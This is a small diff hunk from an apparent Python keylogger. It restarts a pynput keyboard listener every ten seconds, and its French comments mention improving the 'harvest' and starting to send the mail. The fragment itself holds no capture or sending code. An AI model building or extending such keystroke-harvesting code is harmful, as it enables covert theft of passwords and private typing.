@@ -90,7 +90,7 @@ def on_press(key):
 
 while True:
     with Listener(on_press=on_press) as listener:
-        Timer(10, listener.stop).start()
+        Timer(10, listener.stop).start() #A changer plus tard pour permettre une meilleure performance de la récolte
         listener.join()
 
     print("Commence à envoyer le mail") # A enlever plus tard
